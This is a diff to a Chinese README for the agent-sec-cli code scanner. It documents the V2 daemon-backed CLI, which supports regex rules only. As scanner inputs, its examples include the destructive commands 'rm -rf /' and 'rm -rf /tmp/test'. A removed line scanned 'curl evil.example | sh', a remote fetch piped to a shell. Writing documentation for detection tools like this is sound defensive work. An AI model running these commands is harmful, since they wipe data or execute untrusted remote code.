@@ -18,6 +18,26 @@ make build-cli
 
 按照 [AgentSecCore 快速开始](QUICKSTART.md) 安装或部署所用 Agent 的 adapter。
 
+## V2 CLI 接口
+
+在 V2 RPM 中，`agent-sec-cli scan-code` 是连接已运行 `agent-sec-daemon` 的 Rust client。
+部署环境通过 `AGENT_SEC_DAEMON_SOCKET` 提供 daemon endpoint；绝对路径 `--socket`
+优先于该变量。CLI 不会启动 daemon，也不会回退到 V1 Python 实现。
+
+```bash
+export AGENT_SEC_DAEMON_SOCKET=/run/agent-sec-core/daemon.sock
+
+# 扫描 Bash（默认语言）或 Python 源码。
+agent-sec-cli scan-code --code 'rm -rf /tmp/test'
+agent-sec-cli --socket /run/agent-sec-core/daemon.sock \
+  scan-code --code 'import os; os.system("rm -rf /")' --language python
+```
+
+V2 scanner 当前只支持内嵌的 regex 规则。`--mode llm` 为兼容性保留，但会返回可解析的
+`LLM model not available` error result，不会连接 Ollama。V2 尚未支持
+`--trace-context` 或写入 code-scan telemetry；依赖这些能力的 Agent hook 会在完成迁移前
+保持延期状态。
+
 ## 环境变量
 
 | Agent 插件 | `CODE_SCANNER_HOOK_ENABLED` | `CODE_SCANNER_MODE` | `CODE_SCANNER_TIMEOUT` |
@@ -80,8 +100,4 @@ Hermes 和 OpenClaw 保留现有 self-protect findings；当工具调用尝试�
 
 ## Hook MODE 与扫描引擎
 
-`CODE_SCANNER_MODE` 控制宿主 hook 响应，不选择扫描引擎。下面独立的 CLI 参数用于选择 `regex` 或 `llm` 扫描：
-
-```bash
-agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
-```
+`CODE_SCANNER_MODE` 控制宿主 hook 响应，不选择扫描引擎。V2 当前只运行内嵌 regex 规则；`--mode llm` 为兼容性保留，会返回 `LLM model not available`。
